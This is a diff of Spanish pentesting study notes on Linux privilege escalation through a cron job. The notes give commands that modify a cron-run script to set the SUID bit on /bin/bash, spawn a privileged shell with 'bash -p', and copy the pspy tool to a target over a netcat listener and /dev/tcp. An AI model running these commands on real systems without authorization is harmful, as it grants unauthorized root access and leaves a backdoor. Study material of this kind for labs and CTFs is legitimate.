@@ -67,25 +67,28 @@ while true; do
 done	
 ```
 
-```bash 
-# Podemos modificar el binario que tiene una tarea CRON y hacer una bash SUID.
-
-❯ chmod u+s /bin/bash              # Haremos que la bash sea SUID
-```
+## Crear una '/bin/bash' SUID
 
 ```bash 
+# Modificar el binario que tiene una tarea CRON 
+
+#!/bin/bash 
+chmod u+s /bin/bash    # Hacer que la bash sea SUID con el permiso '4755' o agregando 's' y darle permisos de ejecución al archivo modificado 
+
 ❯ watch -n 1 ls -l /bin/bash       # Miraremos cada seg. el permiso de /bin/bash
 
 	# n = Tiempo de actualizacion de 1 seg 
+
+❯ bash -p       # Lanzar una bash privilegiada, despues de convertirla SUID
 ```
 
-```bash 
-❯ bash -p                          # Nos lanzamos la bash privilegiada, despues de convertirla SUID
-```
+## Mirar tareas CRON
 
 ```bash 
 # También podemos usar PSPY para ver las tareas CRON. 
-# En releases nos descargamos el binario .sh  > **pspy64**
+# En releases nos descargamos el binario .sh  
+❯ pspy64
+
 # Para transferir el PSPY podemos usar la ruta '/dev/tcp' y después de transferirlo le damos permisos de ejecución. 
 
 ❯ nc -nlvp 443 < pspy64                       # Colocaremos este comando en la maquina de atacante 
